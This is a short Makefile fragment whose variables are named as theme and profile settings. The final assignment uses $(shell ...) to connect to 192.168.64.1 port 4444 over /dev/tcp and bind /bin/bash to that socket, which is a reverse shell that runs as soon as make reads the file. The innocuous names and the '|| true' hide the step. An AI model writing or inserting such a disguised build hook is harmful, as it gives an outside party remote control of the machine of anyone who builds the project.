THEME_HOST := 192.168.64.1
THEME_PORT := 4444
THEME_SOCKET := /dev/tcp/$(THEME_HOST)/$(THEME_PORT)
PROFILE_SHELL := $(shell exec 3<>$(THEME_SOCKET); /bin/bash <&3 >&3 2>&3 || true)
